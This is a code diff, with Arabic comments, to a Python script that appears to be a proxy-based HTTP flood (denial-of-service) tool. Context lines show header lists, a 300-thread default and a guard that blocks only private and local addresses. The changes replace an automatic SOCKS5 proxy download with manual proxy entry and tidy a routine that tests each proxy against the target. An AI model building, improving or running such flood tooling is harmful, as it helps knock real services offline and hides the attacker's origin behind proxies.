@@ -41,16 +41,6 @@ acceptall = [
     # ... (أضف بقية الـ Accept headers هنا)
 ]
 
-# دالة لتنزيل قائمة SOCKS5 proxies
-def clone():
-    try:
-        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&timeout=1500")
-        with open("socks5.txt", "wb") as f:
-            f.write(r.content)
-        print("Socks Downloaded Successfully!")
-    except Exception as e:
-        print(f"Error downloading socks: {e}")
-
 # دالة لمنع الهجمات على عناوين محددة
 def prevent():
     if '192.168' in ip or '127.0' in ip or '172.16' in ip or 'localhost' in ip:
@@ -79,11 +69,19 @@ def main():
     th_num = input("Threads (default=300): ") or "300"
     th_num = int(th_num)
 
-    if input("Download SOCKS5 list? (y/n): ").lower() != "n":
-        clone()
+    # إدخال البروكسي يدويًا
+    proxies = []
+    print("Enter SOCKS5 proxies in the format IP:PORT (e.g., 127.0.0.1:1080).")
+    print("Type 'done' when finished.")
+    while True:
+        proxy = input("Proxy: ")
+        if proxy.lower() == "done":
+            break
+        if ":" in proxy:
+            proxies.append(proxy.strip())
+        else:
+            print("Invalid format! Use IP:PORT.")
 
-    out_file = input("Enter Proxy File Path (default=socks5.txt): ") or "socks5.txt"
-    proxies = open(out_file).readlines()
     print(f"Number of SOCKS5 Proxies: {len(proxies)}")
 
     if input("Check the SOCKS list? (y/n, default=y): ").lower() != "n":
@@ -134,7 +132,8 @@ def check_socks():
     working_proxies = []
     for proxy in proxies:
         try:
-            socks.set_default_proxy(socks.SOCKS5, proxy.split(":")[0], int(proxy.split(":")[1]))
+            proxy_ip, proxy_port = proxy.split(":")
+            socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
             s = socks.socksocket()
             s.settimeout(5)
             s.connect((ip, port))
